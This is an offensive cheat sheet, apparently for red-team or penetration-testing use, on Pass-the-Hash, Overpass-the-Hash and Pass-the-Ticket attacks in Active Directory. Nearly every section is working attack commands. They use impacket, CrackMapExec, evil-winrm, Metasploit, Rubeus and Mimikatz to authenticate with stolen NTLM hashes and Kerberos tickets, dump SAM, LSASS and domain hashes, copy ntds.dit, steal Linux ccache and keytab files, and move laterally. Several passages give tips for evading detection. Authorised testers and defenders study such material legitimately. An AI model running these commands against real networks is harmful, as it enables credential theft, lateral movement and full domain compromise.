# Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash Matrix

The three core credential reuse attacks. Each has a different input, output, and use case. Know the difference and when to use each.

---

## Quick Decision Matrix

```
I have...           Need to access...    Use...
─────────────────────────────────────────────────────────────────
NTLM hash           SMB/WinRM/WMI        Pass-the-Hash (PTH)
NTLM hash           Kerberos-only svc    Overpass-the-Hash (OPtH)
Kerberos ticket     Any Kerberos svc     Pass-the-Ticket (PTT)
AES256 hash         Kerberos service     Overpass-the-Hash /aes256
.ccache file (Linux) Any service         Export KRB5CCNAME + impacket
.kirbi file (Windows) Any service        Rubeus ptt /ticket:<base64>
```

---

## Part 1: Pass-the-Hash (PTH)

**What:** Use an NTLM hash directly to authenticate — no password cracking needed.
**Where NTLM auth works:** SMB, WinRM, WMI, MSSQL, RDP (restricted admin mode only)
**Where it fails:** Services that require Kerberos (some modern environments disable NTLM)

### Impacket Suite (from Kali)

```bash
# PSExec — drops a service binary (noisy, but interactive SYSTEM shell)
impacket-psexec DOMAIN/user@TARGET -hashes :NTHASH

# WMIExec — no binary drop, uses WMI (quieter)
impacket-wmiexec DOMAIN/user@TARGET -hashes :NTHASH

# SMBExec — uses writable SMB share for execution
impacket-smbexec DOMAIN/user@TARGET -hashes :NTHASH

# atexec — uses Task Scheduler for one-shot command execution
impacket-atexec DOMAIN/user@TARGET -hashes :NTHASH whoami

# secretsdump — dump hashes/tickets without dropping Mimikatz
impacket-secretsdump DOMAIN/user@TARGET -hashes :NTHASH

# Full hash format:
impacket-wmiexec corp.com/Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
# The first half (LM) can always be aad3b435b51404eeaad3b435b51404ee (empty LM hash)
```

### CrackMapExec (CME) — Network-wide PTH

```bash
# Test hash against a range (mark valid with [+])
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTHASH --continue-on-success

# Execute a command if valid
crackmapexec smb 192.168.1.10 -u Administrator -H NTHASH -x "whoami"

# Dump SAM on all matching hosts
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTHASH --sam

# WinRM PTH
crackmapexec winrm 192.168.1.10 -u Administrator -H NTHASH -x "whoami"

# MSSQL PTH
crackmapexec mssql 192.168.1.10 -u sa -H NTHASH -q "SELECT @@version"

# Full hash format for CME (NT hash only, no LM needed):
crackmapexec smb 192.168.1.10 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42
```

### Evil-WinRM (Interactive Shell via WinRM)

```bash
# WinRM must be open (port 5985/5986)
evil-winrm -i 192.168.1.10 -u Administrator -H NTHASH

# With domain:
evil-winrm -i 192.168.1.10 -u "CORP\Administrator" -H NTHASH

# Upload a file during session:
upload /path/to/local/file.exe C:\Windows\Temp\file.exe

# Download a file:
download C:\Windows\NTDS\ntds.dit /tmp/ntds.dit
```

### Meterpreter PTH

```
# From existing Meterpreter session — inject hash for lateral movement
msf > use exploit/windows/smb/psexec
msf > set RHOSTS 192.168.1.10
msf > set SMBUser Administrator
msf > set SMBPass aad3b435b51404eeaad3b435b51404ee:NTHASH
msf > run

# Or from a Meterpreter session using incognito + token:
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "CORP\\Administrator"
```

---

## Part 2: Overpass-the-Hash (OPtH)

**What:** Convert an NTLM hash into a Kerberos TGT. Use when the target requires Kerberos auth (not NTLM), or when you want to blend in better.

**Why OPtH instead of PTH:**
- Forces Kerberos — less detection on some networks that alert on NTLM
- Gives you a TGT you can inject and reuse for multiple services
- Works with AES256 keys (even harder to detect than RC4/NTLM)

### Rubeus (on Windows victim)

```powershell
# NTLM hash → TGT (inject directly into current session):
.\Rubeus.exe asktgt /user:Administrator /ntlm:NTHASH /domain:corp.com /ptt

# AES256 key → TGT (stealthier — AES is the default in modern AD):
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256KEY /domain:corp.com /ptt

# Check ticket was injected:
klist

# Don't inject — just get the base64 ticket for later use:
.\Rubeus.exe asktgt /user:Administrator /ntlm:NTHASH /domain:corp.com /nowrap

# Renew ticket before it expires (TGTs valid 10h by default):
.\Rubeus.exe renew /ticket:<base64_ticket> /ptt
```

### Mimikatz sekurlsa::pth (spawns new process with stolen creds)

```
# Open new cmd.exe as the hash-owner (creates sacrificial process):
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:NTHASH /run:cmd.exe

# With AES256:
sekurlsa::pth /user:Administrator /domain:corp.com /aes256:AES256KEY /run:powershell.exe

# The new window operates as that user — now run net use, PsExec, etc.
# Example: net use \\TARGET\c$ — authenticates with the stolen identity
```

### Impacket getTGT (from Kali — get TGT as .ccache)

```bash
# Get TGT using NTLM hash (stored as .ccache):
impacket-getTGT corp.com/Administrator -hashes :NTHASH -dc-ip 192.168.1.1

# Get TGT using AES256:
impacket-getTGT corp.com/Administrator -aesKey AES256KEY -dc-ip 192.168.1.1

# Export and use:
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.com/Administrator@TARGET
```

---

## Part 3: Pass-the-Ticket (PTT)

**What:** Steal a valid Kerberos ticket (TGT or TGS) and inject it into your session. No hash needed — only requires access to memory or ticket files.

**When it's valuable:**
- You have a high-privilege Kerberos ticket but no password/hash
- Delegated tickets (Unconstrained Delegation attack)
- Service tickets to specific resources

### Rubeus — Dump and Inject

```powershell
# Dump ALL tickets from current machine (requires admin/SYSTEM):
.\Rubeus.exe dump /nowrap

# Dump tickets for a specific user:
.\Rubeus.exe dump /user:Administrator /nowrap

# Dump tickets from a specific LUID (logon session):
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Inject a ticket (base64-encoded .kirbi):
.\Rubeus.exe ptt /ticket:<base64_blob>

# Inject from a .kirbi file:
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Verify injection:
.\Rubeus.exe triage    # see all current tickets
klist                   # simpler view
```

### Mimikatz — Ticket Extraction

```
# Export all current tickets to .kirbi files (in current dir):
sekurlsa::tickets /export

# Import a .kirbi back in:
kerberos::ptt C:\path\to\ticket.kirbi

# List current tickets:
kerberos::list

# Purge current tickets (clean state before injecting):
kerberos::purge
```

### Lateral Movement After Ticket Injection

```powershell
# Once ticket is injected — use standard Windows tools:
dir \\TARGET\C$              # SMB access
.\PsExec.exe \\TARGET cmd    # interactive shell
net use \\TARGET\C$          # map drive
Enter-PSSession TARGET        # PowerShell Remoting (if WinRM)
```

---

## Part 4: Linux-to-Windows Kerberos

**When:** You're on a Linux pivot box (often via web shell or SSH) that is domain-joined or has network access to the DC.

### Steal .ccache from Running System

```bash
# Kerberos tickets cached in /tmp as krb5cc_<UID>
ls -la /tmp/krb5cc_*
ls -la /tmp/krb5cc_$(id -u)

# Copy to your working dir (can't use in-place for some tools):
cp /tmp/krb5cc_1000 /tmp/stolen.ccache

# Export for use:
export KRB5CCNAME=/tmp/stolen.ccache

# Test the ticket works:
klist -c /tmp/stolen.ccache

# Use with impacket tools (-k = use Kerberos, -no-pass = use ccache):
impacket-psexec -k -no-pass corp.com/user@DC01.corp.com
impacket-secretsdump -k -no-pass corp.com/user@DC01.corp.com
impacket-wmiexec -k -no-pass corp.com/Administrator@TARGET
impacket-smbclient -k -no-pass corp.com/user@TARGET
```

### Use a .keytab File

```bash
# Found a .keytab file (service account credential file — common on Linux services):
find / -name "*.keytab" 2>/dev/null
find / -name "krb5.keytab" 2>/dev/null     # most common path

# Get a TGT from the keytab (no password needed):
kinit -kt /etc/krb5.keytab svc_account@CORP.COM

# Verify:
klist

# Now use KRB5CCNAME as above
export KRB5CCNAME=/tmp/krb5cc_$(id -u)
impacket-wmiexec -k -no-pass corp.com/svc_account@DC01.corp.com
```

### /etc/krb5.conf — Required for impacket

```bash
# Impacket needs to find the KDC. If not already configured:
cat /etc/krb5.conf

# Minimal working config (set REALM and KDC to match the AD domain):
cat > /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    CORP.COM = {
        kdc = DC01.corp.com
        admin_server = DC01.corp.com
    }

[domain_realm]
    .corp.com = CORP.COM
    corp.com = CORP.COM
EOF

# Also add DC to /etc/hosts if DNS not available:
echo "192.168.1.1 DC01.corp.com DC01" >> /etc/hosts
```

### Pass .ccache via SOCKS proxy (through tunnel)

```bash
# When accessing DC through a Chisel/Ligolo SOCKS tunnel:
# proxychains4 + impacket works BUT you MUST use hostnames (not IPs) for Kerberos

# proxychains4 configuration:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Usage through proxy:
proxychains4 impacket-secretsdump -k -no-pass corp.com/Administrator@DC01.corp.com
proxychains4 impacket-psexec -k -no-pass corp.com/Administrator@DC01.corp.com
```

---

## Common Hash Formats Reference

```
NTLM hash (NT hash):      32-character hex string
  e19ccf75ee54e06b06a5907af13cef42

LM:NTLM format (impacket):
  aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
  (LM half is always the empty-LM constant if LM is disabled)

NetNTLMv1 (relay/crack):  NTLM challenge-response — NOT directly usable for PTH
NetNTLMv2 (relay/crack):  same — must crack or relay, cannot PTH directly

AES128 Kerberos key:      32 hex chars
AES256 Kerberos key:      64 hex chars
```

---

## Quick Wins on Each Target Type

| Target | Tool | Auth Method |
|--------|------|-------------|
| SMB (445) | `impacket-psexec` / CME | NTLM hash or Kerberos |
| WinRM (5985) | `evil-winrm` | NTLM hash |
| RDP (3389) restricted admin | `xfreerdp /pth` | NTLM hash |
| MSSQL (1433) | CME mssql | NTLM hash |
| WMI | `impacket-wmiexec` | NTLM hash or Kerberos |
| LDAP/LDAPS | `impacket-ntlmrelayx` | relay only |
| Any Kerberos svc | Rubeus asktgt + klist | OPtH → TGT |

### RDP Restricted Admin (PTH to desktop)

```bash
# Windows: enable Restricted Admin mode first (if not already set):
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Kali: xfreerdp PTH
xfreerdp /v:192.168.1.10 /u:Administrator /pth:NTHASH /cert-ignore +clipboard
```

---

## Where to Get Hashes

```
Method                  Where found                    Type
──────────────────────────────────────────────────────────────
LSASS dump              Memory of any logged-in svc    NTLM + AES256
SAM dump                Local machine (SYSTEM needed)  Local NTLM
secretsdump/DCSync      Domain Controller              All domain hashes
Kerberoast              Service account ticket         NTLMv2-like (crack)
NTLM relay capture      Network coercion               NetNTLMv2 (relay only)
.ccache file            Linux /tmp/                    Kerberos ticket
.kirbi file             Windows memory export          Kerberos ticket
.keytab file            Linux /etc/ or service dirs    Kerberos long-term key
```
